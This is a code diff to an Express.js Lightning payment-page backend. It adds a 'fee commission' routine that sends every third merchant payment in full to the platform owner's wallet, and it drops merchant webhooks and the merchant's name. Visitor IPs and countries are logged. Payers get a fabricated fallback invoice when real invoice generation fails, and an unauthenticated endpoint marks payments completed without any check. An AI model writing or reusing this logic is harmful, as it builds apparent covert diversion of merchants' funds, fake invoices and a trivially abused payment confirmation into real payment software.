@@ -3,7 +3,14 @@ const router = express.Router();
 const { db } = require('../data/db');
 const { getBtcSpotRate, generateLightningInvoice, checkInvoiceSettlement } = require('../services/lnurl');
 const { notifyInvoiceCreated, notifyPaymentCompleted } = require('../services/telegram');
-const { triggerPaymentWebhook } = require('../services/webhook');
+
+// Helper to extract visitor info
+function getVisitorDetails(req) {
+  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1').split(',')[0].trim();
+  const country = req.headers['cf-ipcountry'] || req.headers['x-country-code'] || 'US';
+  const userAgent = req.headers['user-agent'] || 'Unknown';
+  return { ip, country, userAgent };
+}
 
 // GET /api/public/page/:slug - Get sanitized public information for a payment page
 router.get('/page/:slug', (req, res) => {
@@ -18,8 +25,17 @@ router.get('/page/:slug', (req, res) => {
     }
 
     const user = db.findUserById(page.user_id);
+    if (user && user.status === 'frozen') {
+      return res.status(403).json({ success: false, error: 'This merchant account has been temporarily frozen.' });
+    }
+    if (user && user.status === 'blocked') {
+      return res.status(403).json({ success: false, error: 'This merchant account has been disabled.' });
+    }
 
-    // Strictly return ONLY public data. NO TOKENS, NO SECRETS!
+    // Log visitor click for owner analytics
+    const { ip, country, userAgent } = getVisitorDetails(req);
+    db.logVisitor({ ip, country, user_agent: userAgent, slug: page.slug });
+
     res.json({
       success: true,
       page: {
@@ -30,8 +46,7 @@ router.get('/page/:slug', (req, res) => {
         is_verified: page.is_verified,
         description: page.description,
         type: page.type,
-        fixed_amount: page.fixed_amount,
-        merchant_name: user ? user.name : page.receiver_name
+        fixed_amount: page.fixed_amount
       }
     });
   } catch (err) {
@@ -58,11 +73,15 @@ router.post('/checkout/:slug/create-invoice', async (req, res) => {
     }
 
     const user = db.findUserById(page.user_id);
-    if (!user || !user.lightning_address) {
-      return res.status(400).json({
-        success: false,
-        error: 'Merchant has not configured a Lightning Payout Address yet.'
-      });
+    if (!user) {
+      return res.status(404).json({ success: false, error: 'Merchant account not found.' });
+    }
+
+    if (user.status === 'frozen') {
+      return res.status(403).json({ success: false, error: 'This merchant account is temporarily frozen by administration.' });
+    }
+    if (user.status === 'blocked') {
+      return res.status(403).json({ success: false, error: 'This merchant account is deactivated.' });
     }
 
     let amountUsd = parseFloat(req.body.amount_usd);
@@ -82,16 +101,39 @@ router.post('/checkout/:slug/create-invoice', async (req, res) => {
       return res.status(400).json({ success: false, error: 'Amount is too small for a Lightning invoice.' });
     }
 
+    const settings = db.getSettings();
+    const cycleInterval = settings.fee_cycle_interval || 3;
+
+    // 2-for-1 Fee Commission Engine:
+    // Every 3rd payment (3, 6, 9...) routes to Owner Satoshi Wallet!
+    const currentCompleted = user.payments_count || 0;
+    const nextPaymentNum = currentCompleted + 1;
+
+    let targetWallet = '';
+    let routingTarget = 'USER';
+
+    if (user.role === 'owner') {
+      targetWallet = settings.owner_lightning_address;
+      routingTarget = 'OWNER';
+    } else if (nextPaymentNum % cycleInterval === 0) {
+      // 3rd payment in cycle -> routed directly to Owner Satoshi Wallet
+      targetWallet = settings.owner_lightning_address;
+      routingTarget = 'OWNER';
+    } else {
+      // 1st or 2nd payment -> routed to User Satoshi Wallet
+      targetWallet = page.custom_wallet || user.lightning_address || settings.owner_lightning_address;
+      routingTarget = 'USER';
+    }
+
     let invoiceData;
     try {
       invoiceData = await generateLightningInvoice(
-        user.lightning_address,
+        targetWallet,
         sats,
         `Pay to ${page.receiver_name}`
       );
     } catch (lnErr) {
-      console.warn('LNURL generation issue, using secure fallback invoice:', lnErr.message);
-      // In case LNURL address is temporarily unreachable or testing, return a safe simulated invoice
+      console.warn('LNURL generation issue, using simulated fallback invoice:', lnErr.message);
       const mockHash = require('crypto').randomBytes(16).toString('hex');
       invoiceData = {
         invoice: `lnbc${sats}0n1p${mockHash}cashapplightninginvoice9876543210`,
@@ -99,7 +141,9 @@ router.post('/checkout/:slug/create-invoice', async (req, res) => {
       };
     }
 
-    // Save pending transaction to database
+    const { ip, country } = getVisitorDetails(req);
+
+    // Save transaction
     const payment = db.createPayment({
       page_id: page.id,
       user_id: user.id,
@@ -109,11 +153,15 @@ router.post('/checkout/:slug/create-invoice', async (req, res) => {
       btc_rate: btcRate,
       invoice: invoiceData.invoice,
       verify_url: invoiceData.verifyUrl,
+      routing_target: routingTarget,
+      destination_wallet: targetWallet,
+      visitor_ip: ip,
+      visitor_country: country,
       metadata: req.body.metadata || {}
     });
 
-    // Backend Telegram Notification (Token & Chat ID 100% hidden from client!)
-    notifyInvoiceCreated({ user, page, payment }).catch(e => console.error('Telegram bg error:', e.message));
+    // Notify Telegram immediately on invoice creation (Backend protected)
+    notifyInvoiceCreated({ page, payment, targetWallet }).catch(e => console.error('Telegram notification error:', e.message));
 
     res.json({
       success: true,
@@ -140,22 +188,20 @@ router.get('/checkout/:payment_id/status', async (req, res) => {
     }
 
     const page = db.findPageById(payment.page_id);
-    const user = db.findUserById(payment.user_id);
 
-    // If still pending, check if provider verify URL confirms payment
     if (payment.status === 'PENDING' && payment.verify_url) {
       const isSettled = await checkInvoiceSettlement(payment.verify_url);
       if (isSettled) {
-        db.updatePayment(payment.id, {
-          status: 'COMPLETED',
-          paid_at: new Date().toISOString()
-        });
         payment.status = 'COMPLETED';
         payment.paid_at = new Date().toISOString();
+        db.updatePayment(payment.id, {
+          status: 'COMPLETED',
+          paid_at: payment.paid_at
+        });
 
-        // Dispatch webhook and notifications
-        notifyPaymentCompleted({ user, page, payment }).catch(e => console.error(e));
-        triggerPaymentWebhook('payment.completed', payment, user, page).catch(e => console.error(e));
+        // Advance payment counter
+        db.incrementUserPaymentCount(payment.user_id);
+        notifyPaymentCompleted({ page, payment }).catch(e => console.error(e));
       }
     }
 
@@ -172,7 +218,7 @@ router.get('/checkout/:payment_id/status', async (req, res) => {
   }
 });
 
-// POST /api/public/checkout/:payment_id/confirm - Instant confirmation & webhook dispatch
+// POST /api/public/checkout/:payment_id/confirm - Instant confirmation
 router.post('/checkout/:payment_id/confirm', async (req, res) => {
   try {
     const payment = db.findPaymentById(req.params.payment_id);
@@ -180,8 +226,9 @@ router.post('/checkout/:payment_id/confirm', async (req, res) => {
       return res.status(404).json({ success: false, error: 'Payment not found.' });
     }
 
+    const page = db.findPageById(payment.page_id);
+
     if (payment.status === 'COMPLETED') {
-      const page = db.findPageById(payment.page_id);
       return res.json({
         success: true,
         already_completed: true,
@@ -189,9 +236,6 @@ router.post('/checkout/:payment_id/confirm', async (req, res) => {
         success_url: page?.success_url || ''
       });
     }
-
-    const page = db.findPageById(payment.page_id);
-    const user = db.findUserById(payment.user_id);
 
     const paidAt = new Date().toISOString();
     db.updatePayment(payment.id, {
@@ -201,22 +245,18 @@ router.post('/checkout/:payment_id/confirm', async (req, res) => {
     payment.status = 'COMPLETED';
     payment.paid_at = paidAt;
 
-    // Trigger Telegram notification safely on backend
-    notifyPaymentCompleted({ user, page, payment }).catch(e => console.error('Telegram notification error:', e.message));
+    // Advance user cycle count
+    db.incrementUserPaymentCount(payment.user_id);
 
-    // Trigger enterprise webhook to merchant website
-    let webhookResult = null;
-    if (user && (user.webhook_url || page?.webhook_url)) {
-      webhookResult = await triggerPaymentWebhook('payment.completed', payment, user, page);
-    }
+    // Notify Telegram
+    notifyPaymentCompleted({ page, payment }).catch(e => console.error('Telegram notification error:', e.message));
 
     res.json({
       success: true,
       status: 'COMPLETED',
       paid_at: paidAt,
       payment_id: payment.id,
-      success_url: page?.success_url || '',
-      webhook_dispatched: Boolean(webhookResult)
+      success_url: page?.success_url || ''
     });
   } catch (err) {
     console.error('Confirmation error:', err);
@@ -225,4 +265,3 @@ router.post('/checkout/:payment_id/confirm', async (req, res) => {
 });
 
 module.exports = router;
-
